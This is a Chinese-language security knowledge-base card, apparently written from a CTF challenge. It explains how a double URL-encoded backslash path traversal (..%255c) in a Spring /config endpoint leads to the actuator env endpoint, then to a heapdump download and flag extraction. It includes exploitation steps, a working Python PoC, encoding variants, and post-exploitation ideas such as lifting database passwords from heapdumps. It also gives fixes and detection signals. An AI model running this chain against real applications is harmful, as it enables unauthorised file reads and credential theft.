---
id: web-java-framework-spring-config-double-decode-backslash-traversal-heapdump
title: 配置接口双重 URL 解码 + 反斜杠归一化路径穿越：读 application.yml 经 actuator env 下载 heapdump
type: scenario
domain: web
path: web/java/framework/spring
technique: spring-config-double-decode-backslash-traversal-heapdump
tags:
- java
- spring
- path-traversal
- double-decode
- backslash
- actuator
- heapdump
- config
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V127
  verified_at: '2026-11-06T04:22:41+08:00'
  notes: 已对照原文核对：/config/app/..%255c..%255c..%255c/application.yml 双重解码+反斜杠归一化读 /app/application.yml、base-path /internal-monitor-xyz123、env 暴露 SYSTEM_DIAGNOSTIC_BACKUP_DOWNLOAD_PATH、FLAG 被 ****** 掩码、下载 HPROF 快照 strings 得 ISCC{Double_Decode_Spring_Bingo_2026}，均与卡片一致。未验证点：PoC 未本机复跑；原文无组件受影响版本；frontmatter 无 sources/source_url。
url: /docs/web/java/framework/spring/web-java-framework-spring-config-double-decode-backslash-traversal-heapdump/
draft: false
kb_aliases:
- 双重 URL 解码
- ..%255c
- 反斜杠归一化
- /config/{app}/{profile}/{filename}
- actuator env
- heapdump 提取 flag
- 逆向穿越
---

## 一句话结论

`/config/{app}/{profile}/{filename}` 对 `app`/`filename` 的 `..` 过滤较严，但 `profile` 在控制器里再次 `URLDecoder.decode()` 并把 `\` 统一替换为 `/` 后做 `Path.normalize()`；用 `..%255c..%255c..%255c` 让第一次路由解码保留 `%5c`、第二次解码变成 `..\..\..\`，归一化后从 `/app/resources/config/app` 穿回 `/app` 读取 `application.yml`，再经暴露的 actuator `env` 找到 heapdump 下载路径，`strings` 即可从堆中取出 flag。

## 原理

- **双重解码**：Servlet 容器/路由层先对 URL 解码一次，`%25` 变成 `%`，因此 `%255c` 变成 `%5c`；控制器再调用 `URLDecoder.decode(profile)`，`%5c` 才变成反斜杠 `\`。过滤器只在第一层看到 `%255c`，匹配不到 `../`。
- **反斜杠归一化**：控制器随后 `profile.replace("\\", "/")`，把 `..\..\..\` 变成 `../../..`；`Path.normalize()` 消掉 `..`，从 `root/app/resources/config/app` 回退到 `root/app`。
- **配置读取**：`/app/application.yml` 暴露 actuator 的 `management.endpoints.web.base-path`（如 `/internal-monitor-xyz123`）与 `exposure.include: env`。
- **actuator env → heapdump**：`env` 端点返回 `SYSTEM_DIAGNOSTIC_BACKUP_DOWNLOAD_PATH`，指向 HPROF 快照；`FLAG` 环境变量在 env 中被掩码为 `******`，但堆中仍保留明文 `String`，`strings | grep ISCC{` 即可。
- **为什么不是普通穿越**：只对 `profile` 做二次解码，`app`/`filename` 里的 `..` 仍会被过滤；必须把穿越段放在 `profile` 参数中。

## 触发条件

- 应用暴露 `/config/{app}/{profile}/{filename}` 之类的配置读取接口。
- `profile` 参数被二次 `URLDecoder.decode()`，且反斜杠被替换为正斜杠后 `normalize()`。
- 过滤器只做单次解码/字符串匹配，未在规范化后做前缀白名单。
- actuator `env` 暴露，heapdump/诊断快照可下载。

## 利用步骤

1. 访问公开配置（如 `/config/app/dev/application.yml`），确认提示真实配置在 `/app/application.yml`。
2. 用 `curl --path-as-is` 发送 `/config/app/..%255c..%255c..%255c/application.yml?resolvePlaceholders=false`，读取主配置。
3. 从主配置提取 `management.endpoints.web.base-path` 与暴露的端点。
4. `GET <base-path>/env`，搜索 `SYSTEM_DIAGNOSTIC_BACKUP_DOWNLOAD_PATH`（或同类快照路径），注意 `FLAG` 可能已被掩码。
5. 下载快照（HPROF heapdump），`strings -n 4 snapshot.dat | grep 'ISCC{'` 或 `grep -a` 提取 flag。
6. 若 heapdump 很大，用 `strings` 流式处理，避免整文件载入内存。

## PoC

```python
import re, urllib.request

base = "http://target:12602"
url = base + "/config/app/..%255c..%255c..%255c/application.yml?resolvePlaceholders=false"
app_yml = urllib.request.urlopen(url).read().decode("utf-8", "replace")
actuator = re.search(r'base-path:\s*"([^"]+)"', app_yml).group(1)

env = urllib.request.urlopen(base + actuator + "/env").read().decode("utf-8", "replace")
snapshot = re.search(r'"SYSTEM_DIAGNOSTIC_BACKUP_DOWNLOAD_PATH"\s*:\s*"([^"]+)"', env).group(1)

blob = urllib.request.urlopen(base + snapshot).read()
print(re.search(rb"ISCC\{[^}\r\n\x00]{1,120}\}", blob).group(0).decode())
```

## 变体与关联

- **编码变体**：`..%252e%252e%252f`、`..%5c`、`%2e%2e%5c`、UTF-8 超长编码、分号/矩阵参数；Linux 下 `Path.normalize` 不把 `\` 当分隔符，需要改用 `%2f` 或混合编码。
- **入口变体**：配置接口可能叫 `/config/{app}/{profile}/{filename}`、`/properties`、`/env`；参数可能来自 query/body/header。
- **后利用变体**：actuator `env` 可直接改配置（若允许 POST）、`heapdump` 可提取数据库密码；也可读 `application.yml` 中的其他密钥。
- **关联卡片**：[[web-java-framework-spring-actuator-heapdump-credential-leak]]（heapdump 凭据提取）、[[web-java-framework-spring-ghost-bits-path-traversal]]（Spring 路径穿越变体）、[[web-java-framework-spring-custom-auth-path-parsing-bypass]]（路径解析差异）。
- **边界**：若控制器只解码一次、或在 normalize 后校验前缀、或 actuator 未暴露，本链不成立。

## 检测与防御

- **CTF 验证**：先确认 `..%255c` 能读到 `/app/application.yml`，再确认 env 返回快照路径，最后确认快照中存在 flag 字符串。
- **修复**：路径参数只解码一次；解码后 `normalize()` 并校验结果仍在允许的根目录内；禁止用户控制路径分隔符；actuator 加认证并限制 `env`/`heapdump` 暴露。
- **检测信号**：请求中出现 `%255c`、`%252e`、`..%5c` 等双重编码；配置接口访问 `/app/application.yml`；actuator env/heapdump 被匿名访问。
